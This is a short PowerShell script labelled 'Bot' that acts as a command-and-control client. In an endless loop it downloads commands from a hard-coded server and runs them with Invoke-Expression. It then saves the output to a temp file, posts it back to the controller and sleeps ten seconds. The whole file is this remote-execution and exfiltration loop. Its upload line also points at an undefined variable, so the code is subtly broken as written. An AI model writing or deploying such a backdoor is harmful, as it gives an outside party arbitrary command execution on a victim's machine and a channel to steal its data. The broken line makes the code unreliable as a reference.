
# Bot
#
# 1. Read the command from the CCC Website
$CCC_URL_Base = "http://10.11.8.38"
$CCC_URL_CommandToExecute = $CCC_URL_Base + "/commandToExecute.txt"
$CCC_URL_UploadResults = $CCC_URL_Base + "/uploadResults.php"

while ($true)
{
    $commndToExecute = Invoke-WebRequest $CCC_URL_CommandToExecute

    # 2. Execute the command
    $commandResult = Invoke-Expression ($commndToExecute.Content)

    # 3. Write the results of the command to command_result.tmp.
    #    This touches the disk, but simplifies this code.  Otherwise we'd need to convert the returning object to a string.
    $commandResult | Out-File $env:TEMP\command_result.tmp

    #    Read the results, this time as plain text
    $commandResultText = Get-Content $env:TEMP\command_result.tmp

    # 4. POST the results (content of command_result.tmp) to the C&C
    $postParams = @{results=$commandResultText}
    Invoke-WebRequest -Uri $CCC_URL -Method POST -Body $postParams

    # 5. Sleep 10 seconds, and repeat
    Start-Sleep 10
}


